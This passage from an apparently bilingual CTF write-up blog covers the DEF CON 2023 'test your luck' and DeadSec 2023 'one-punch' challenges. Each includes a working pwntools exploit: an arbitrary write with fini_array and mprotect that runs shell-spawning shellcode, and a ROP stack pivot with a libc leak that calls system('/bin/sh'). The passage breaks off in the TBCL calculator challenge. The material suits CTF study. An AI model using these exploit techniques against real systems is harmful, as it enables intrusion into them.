class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x2b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x75</span>, <span class="number">0x9</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5b</span>, <span class="number">0x5d</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>, <span class="number">0xc3</span>, <span class="number">0xe8</span>, <span class="number">0xd2</span>, <span class="number">0xee</span>, <span class="number">0xff</span>, <span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buf)):</span><br><span class="line">    addr = <span class="number">0x2000</span> + i</span><br><span class="line">    byte = buf[i]</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&#x27;patch_byte(&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(addr))+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))+<span class="string">&#x27;);&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd) </span><br></pre></td></tr></table></figure><p>ìœ„ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•´ì„œ ë‚˜ì˜¨ ê²°ê³¼ë¥¼ IDAì—ì„œ ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‹¤í–‰í•˜ë©´ ëœë‹¤. ì´ë•Œ ì¤‘ìš”í•œ ì ì€ IDAì— ë°˜ì˜í•˜ê³  â€˜reanalyze programâ€™ í•œ í›„ ê»ë‹¤ ì¼œì•¼ ë””ì»´íŒŒì¼ì´ ë˜ëŠ”ë° ëŒ ë•Œ â€˜DONâ€™T SAVE the databaseâ€™ì„ ì²´í¬í•´ì•¼ í•œë‹¤.</p><p>You can execute the result of executing the above python script as a script in IDA. At this time, the important point is to reflect in IDA, â€˜reanalyze programâ€™, and guit IDA. When quiting it, You have to check â€˜DONâ€™T SAVE the databaseâ€™. Now, you can see decompiled source code.</p><p><br><br><br><img src="/images/230601-defcon2023-test-your-luck/2.png" width=550/></p><img src="/images/230601-defcon2023-test-your-luck/3.png" width=550/><p>ì‚¬ì‹¤ ë‚˜ëŠ” í•¨ìˆ˜ë¥¼ ë””ì½”ë“œ í•˜ê¸° ì „ì— ë””ë²„ê¹…í•˜ë©´ì„œ ìž„ì˜ì“°ê¸°ë¥¼ ë°œê²¬í–ˆë‹¤. whileë¬¸ì„ ì´ìš©í•´ì„œ ì›í•˜ëŠ” ë§Œí¼ ìž„ì˜ ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ë‹¤. syscallì„ ì´ìš©í•´ì„œ bufì— 8ë°”ì´íŠ¸ ìž…ë ¥ì„ ë°›ëŠ”ë°, íŠ¹ì • ì£¼ì†Œë¥¼ ê±°ë¥´ê³  ìžˆë‹¤. ì´ëŠ” got ì˜ì—­ì„ í¬í•¨í•œë‹¤. ë°˜ë³µë¬¸ì„ ëë‚´ê³  ì‹¶ìœ¼ë©´ 0ì„ ìž…ë ¥í•˜ë©´ ëœë‹¤. 30ë²ˆì§¸ ë¼ì¸ì—ì„œ ì›í•˜ëŠ” ì£¼ì†Œì— ì›í•˜ëŠ” ê°’ì„ ì“°ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìžˆë‹¤.</p><p>Actually I found arbitrary writes before decoding the function. It is possible to write arbitrarily as many times as desired by using a while statement. The buf is received 8 bytes input by using a syscall. Itâ€™s filtering out a specific address including got space. If you want to end the loop, you can send 0. In the 30th line, you can find exactly arbitrary writes.</p><p><br><br><br><img src="/images/230601-defcon2023-test-your-luck/6.png" width=550/></p><p>sub_2000 í•¨ìˆ˜ë¥¼ xrefë¡œ í™•ì¸í•´ë³´ë©´ sub_2000 í•¨ìˆ˜ë¥¼ decode í•´ì£¼ëŠ” í•¨ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜ ìžˆë‹¤. ê·¸ í•¨ìˆ˜ì—ì„œ sub_2000ì„ decode í•œ í›„, íŠ¹ì •í•œ í”„ë¡œê·¸ëž¨ ì˜ì—­ì„ rwxë¡œ ê¶Œí•œì„ ë°”ê¿”ì£¼ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤. ì´ í•¨ìˆ˜ë¥¼ mprotect_rwx() í•¨ìˆ˜ë¡œ ë„¤ì´ë°í•´ì£¼ì—ˆë‹¤. ì´ ë¬¸ì œëŠ” NX_bit ë³´í˜¸ê¸°ë²•ì´ ì—†ì–´ì„œ ì´ í•¨ìˆ˜ë¥¼ í™œìš©í•˜ë©´ ì¢‹ê² ë‹¤ëŠ” ìƒê°ì„ í–ˆë‹¤.  </p><p>If you check the sub_2000 function by xref, you can find a function that decodes the sub_2000 function. After decode sub_2000 in that function, call a function that changes the authority of a specific program area to rwx. I named this function mprotect_rwx() function. Since there is no NX bit mitigation for this challenge, I thought it would be nice to use this function.</p><p><br><br></p><p>sub_2000 í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ í›„ ì•„ëž˜ì™€ ê°™ì€ ë¡œì§ì˜ generate_random() í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤. ì‚¬ì‹¤ìƒ ì™„ì „í•œ randomì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— ì˜ˆì¸¡ê°€ëŠ¥í•˜ë‹¤. </p><p>The generated_random() function is called after the sub_2000 function is called. The random_value isnâ€™t definitly random. So It could be predictable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword_45B0 = dword_45B8 + dword_45B0 * dword_45B4;<span class="comment">// random_value ì˜ˆì¸¡ ê°€ëŠ¥</span></span><br><span class="line">random_value = dword_45B0;</span><br></pre></td></tr></table></figure><p>ìš°ë¦¬ì—ê² ìž„ì˜ ì“°ê¸°ê°€ ìžˆê¸° ë•Œë¬¸ì— random_valueë¥¼ ì˜ˆì¸¡í•  ìˆ˜ ìžˆë‹¤. ì´ í•¨ìˆ˜ê°€ ì¢…ë£Œë˜ë©´ ë“œë””ì–´ main í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ”ë°, random_valueëŠ” main í•¨ìˆ˜ì—ì„œ ì‚¬ìš©ëœë‹¤. random_valueë¥¼ ì˜ˆì¸¡í•˜ë©´ Correct!ì„ ì¶œë ¥í•˜ê³  í‹€ë¦¬ë©´ Incorrectë¥¼ ì¶œë ¥í•´ì¤€ë‹¤. main í•¨ìˆ˜ì—ì„œëŠ” ë³„ë‹¤ë¥¸ ì·¨ì•½ì ì´ ë³´ì´ì§€ ì•Šì•˜ë‹¤.</p><p>Because we have arbitrary writes, you can predict random_value. When this function ends, the main function is finally called, and random_value is used in the main function. If random_value is predicted, â€˜Correct!â€™ is output, otherwise â€˜Incorrectâ€™ is output. I couldnâ€™t find any vulnerabilities in the main function.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ì²˜ìŒì— pie ì£¼ì†Œê°€ ì¶œë ¥ë˜ì–´ì„œ ì´ê²ƒë¶€í„° ë¦­í•´ì£¼ì—ˆë‹¤. </p><p>At first, the pie address was printed, So I leaked it.</p><p>ì „ëžµì€ ë‹¤ìŒê³¼ ê°™ë‹¤. ì‰˜ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì— ì‰˜ì½”ë“œ ì‹¤í–‰ì„ ëª©í‘œë¡œ ì‚¼ì•˜ë‹¤. ê·¸ë¦¬ê³  ìž„ì˜ ì“°ê¸°ë¥¼ ì´ìš©í•˜ì—¬ w ê¶Œí•œì´ ì£¼ì–´ì§„ ê³³ì— ì‰˜ì½”ë“œë¥¼ ì“°ê¸°ë¡œ í–ˆë‹¤. ìŠ¤íƒ ì£¼ì†Œë¥¼ ì•Œê¸°ê°€ íž˜ë“¤ê¸° ë•Œë¬¸ì— ì§€ê¸ˆ í˜„ìž¬ ì•Œê³  ìžˆëŠ” pie ì£¼ì†Œë¥¼ ìµœëŒ€í•œ í™œìš©í•˜ê³ ìž í–ˆë‹¤. </p><p>The strategy is this. Because shellcode execution is possible, I targeted shellcode execution. And I decide to write shellcode at area with w authority by using arbitrary writes. It was difficult to know stack address, So I wanted to make the most of the pie address I currently know.</p><img src="/images/230601-defcon2023-test-your-luck/4.png" width=600/><p>mprotect_rwx() í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ ìœ„ì™€ ê°™ì´ ì € ì˜ì—­ì´ rwxë¡œ ë³€í•˜ê¸° ë•Œë¬¸ì— ì ë‹¹í•˜ë‹¤ê³  ìƒê°í–ˆë‹¤. ì´ë¥¼ ìœ„í•´ generate_random() í•¨ìˆ˜ ëŒ€ì‹  mprotect_rwx() í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ë„ë¡ í•˜ê¸°ë¡œ ê²°ì‹¬í–ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ fini_arrayë¥¼ ì´ìš©í•´ì„œ sub_2000ê°€ í•œ ë²ˆ ë” ì‹¤í–‰ë˜ê²Œ í–ˆë‹¤.</p><p>When mprotect_rwx() function was called, the above area was changed to rwx autority. So I thought this area was suitable for writing shellcode. For this, I decided to have the mprotect_rwx() function call instead of the generate_random() function. Finally sub_2000 function is called one more time by using fini_array.</p><p><br><br></p><p>sub_2000ê°€ í•œ ë²ˆ ë” ì‹¤í–‰ë˜ê³ , ì´ì œ rwx ê¶Œí•œì´ ì£¼ì–´ì§„ í”„ë¡œê·¸ëž¨ ì˜ì—­ì— ìž„ì˜ ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ë‹¤. sub_2000 í•¨ìˆ˜ì—ì„œ ìž„ì˜ì“°ê¸°ê°€ ëë‚œ í›„ ì¢…ë£Œë˜ëŠ” ì•„ëž˜ ì˜ì—­ì´ ì‰˜ì½”ë“œë¥¼ ìž‘ì„±í•˜ê¸°ì— ê°€ìž¥ ì ë‹¹í•˜ë‹¤ê³  íŒë‹¨í–ˆë‹¤.  </p><p>The sub_2000 is called one more, and now arbitrary writes are possible to the program area given the rwx permission. In the sub_2000 function, it was determined that the area below, which ends after arbitrary writing is finished, is the most suitable for writing shellcode.</p><img src="/images/230601-defcon2023-test-your-luck/5.png" width=550/><br><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = os.environ.get(<span class="string">&#x27;HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">p = remote(HOST, <span class="built_in">int</span>(PORT))</span><br><span class="line"><span class="comment"># p = process(&#x27;./../handout/challenge&#x27;)</span></span><br><span class="line"></span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># info(hex(pie_base))</span></span><br><span class="line"></span><br><span class="line">fini_array = pie_base + <span class="number">0x4338</span></span><br><span class="line"></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x4330</span>)) <span class="comment"># generate_random</span></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x1370</span>)) <span class="comment"># mprotect_rwx</span></span><br><span class="line"></span><br><span class="line">p.send(p64(fini_array)) </span><br><span class="line">p.send(p64(pie_base + <span class="number">0x2000</span>)) <span class="comment"># one more</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># for main</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; one more sub_2000 &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_addr = pie_base + <span class="number">0x2140</span> </span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(hex(len(shellcode))) # 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.send(p64(shellcode_addr + i*<span class="number">8</span>))</span><br><span class="line">    p.send(shellcode[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;./submitter&#x27;</span>)</span><br><span class="line"><span class="comment"># flag = p.recvline_contains(b&#x27;LiveCTF&#123;&#x27;).decode().strip()</span></span><br><span class="line"><span class="comment"># log.info(&#x27;Flag: %s&#x27;, flag)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Defcon </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON CTF Qualifier 2023 review</title>
      <link href="/230531-defcon2023-0review/"/>
      <url>/230531-defcon2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li><li><a href="https://github.com/Nautilus-Institute/quals-2023">https://github.com/Nautilus-Institute/quals-2023</a></li></ul><p>Last year I participated by sleeping less, but it didnâ€™t contribute anything. This year, I solved challenges with a lot of solves, but Iâ€™m proud of myself because I solved them myself. XD</p><ul><li><a href="https://jiravvit.github.io/230602-defcon2023-open-house/">https://jiravvit.github.io/230602-defcon2023-open-house/</a></li><li><a href="https://jiravvit.github.io/230601-defcon2023-test-your-luck/">https://jiravvit.github.io/230601-defcon2023-test-your-luck/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Defcon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DeadSec CTF 2023 - one-punch (stack pivoting)</title>
      <link href="/230524-deadsecctf2023-one_punch/"/>
      <url>/230524-deadsecctf2023-one_punch/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1962">https://ctftime.org/event/1962</a></li></ul><blockquote><p>100 BOFs, 100 UAFs, 100 Race cons and a 10 km ROP chain, EVERY SINGLE DAY!!!<br>netcat.deadsec.quest 31794<br>Author: Goldenboy</p></blockquote><ul><li>[39 solves &#x2F; 241 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> garou[<span class="number">100</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(key, mapped_region) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Two punch man? lameeeeee&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">420</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(mapped_region, <span class="number">0</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">  mprotect(mapped_region, <span class="number">0x1000</span>uLL, <span class="number">1</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(garou);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainìœ¼ë¡œ ë‹¤ì‹œ ëŒì•„ì˜¤ëŠ” ê²ƒì´ íž˜ë“¤ì–´ë³´ì—¬ bssì˜ì—­ì— íŽ˜ì´ë¡œë“œë¥¼ ìž…ë ¥ë°›ì•„ ì´ë¥¼ í™œìš©í•˜ê¸°ë¡œ í–ˆë‹¤. bofê°€ <code>gets</code> í•¨ìˆ˜ë¥¼ í†µí•´ í„°ì ¸ì£¼ë‹ˆ ìž…ë ¥ ì‚¬ì´ì¦ˆ ì œí•œë„ ì—†ì–´ì„œ ì¢‹ë‹¤. </p><p>bss ì˜ì—­ì— <code>system</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•œ rop payloadë¥¼ ì €ìž¥ì‹œí‚¬ ë•Œ ì¤‘ìš”í•œ ì ì€ <code>system</code> í•¨ìˆ˜ëŠ” ìŠ¤íƒì„ ë§Žì´ ì‚¬ìš©í•˜ë‹ˆ ë„‰ë„‰í•œ ê³µê°„ì— ë„£ì–´ì¤˜ì•¼í•œë‹¤ëŠ” ê²ƒì´ë‹¤. ê·¸ëž˜ì„œ <code>bss + 0x700</code>ì— rop payloadë¥¼ ìž…ë ¥ ë°›ê³  rbpë¡œ ì„¤ì •í•˜ì˜€ë‹¤.</p><p>ì°¸ê³ ë¡œ ë¬¸ì œë¥¼ í’€ë©´ì„œ <code>system</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ <code>xmm</code> ë ˆì§€ìŠ¤í„° ê´€ë ¨í•œ ì—ëŸ¬ê°€ ë°œìƒí–ˆëŠ”ë°, ì´ëŠ” stack alignì´ ì•ˆë§žì•„ì„œ ë°œìƒí•˜ëŠ” ê²ƒì´ë‹¤. rbpëŠ” í•­ìƒ 16ì˜ ë°°ìˆ˜ì—¬ì•¼ í•œë‹¤. </p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./one_punchp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;netcat.deadsec.quest&#x27;</span>, <span class="number">31794</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./one_punchp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x1291</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">mapped_region = e.address + <span class="number">0x4050</span></span><br><span class="line">pop_rdi = e.address + <span class="number">0x1291</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line">leave_ret = e.address + <span class="number">0x132f</span></span><br><span class="line">info(<span class="built_in">hex</span>(mapped_region))</span><br><span class="line"></span><br><span class="line">bss = e.bss()</span><br><span class="line">info(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(bss + <span class="number">0x700</span>) <span class="comment"># for stack pivoting</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss + <span class="number">0x700</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(leave_ret) <span class="comment"># for stack pivoting</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># push_rsp_ret = libc.address + 0x4181d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dead&#123;I_w4nn4_b3_4_s41ky0u_H3R00000000&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> DeadSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TBCL CTF 2023 - Math is Hard (python, eval)</title>
      <link href="/230524-tbclctf2023-math_is_hard/"/>
      <url>/230524-tbclctf2023-math_is_hard/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2002">https://ctftime.org/event/2002</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><p>ë°”ë¡œ ì§€ë‚œ ì£¼ë§ì— ì¹˜ë¤„ì§„ ëŒ€íšŒì¸ë° challengeê°€ ëª¨ë‘ ë‚´ë ¤ê°€ì„œ ë¬¸ì œ ì •ë³´ë¥¼ ì•Œ ìˆ˜ê°€ ì—†ë‹¤ ã…œã…œ</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë¬¸ì œëŠ” python ìŠ¤í¬ë¦½íŠ¸ í•˜ë‚˜ë§Œ ì£¼ì–´ì§„ë‹¤. calc.py<br>python ìŠ¤í¬ë¦½íŠ¸ë§Œ ì£¼ì–´ì§€ëŠ” ë¬¸ì œëŠ” í•­ìƒ ê¸´ìž¥ëœë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">USAGE = <span class="string">&quot;&quot;&quot;PwnCalc -- a simple calculator</span></span><br><span class="line"><span class="string">$ a=4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ a = 4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ b = 3</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>b = 3</span></span><br><span class="line"><span class="string">$ c = sqrt(a*a+b*b)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>c = 5.0</span></span><br><span class="line"><span class="string">$ d = sin(pi/4)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>d = 0.7071067811865475</span></span><br><span class="line"><span class="string">Have fun!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_expression</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Allow only digits, decimal point, lowecase letters and math symbols.&quot;&quot;&quot;</span></span><br><span class="line">    SYMBOLS = <span class="string">&quot;.+*-/()&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c.islower() <span class="keyword">and</span> <span class="keyword">not</span> c.isdigit() <span class="keyword">and</span> c <span class="keyword">not</span> <span class="keyword">in</span> SYMBOLS:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main calculator loop.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">vars</span> = &#123; c : <span class="number">0</span> <span class="keyword">for</span> c <span class="keyword">in</span> 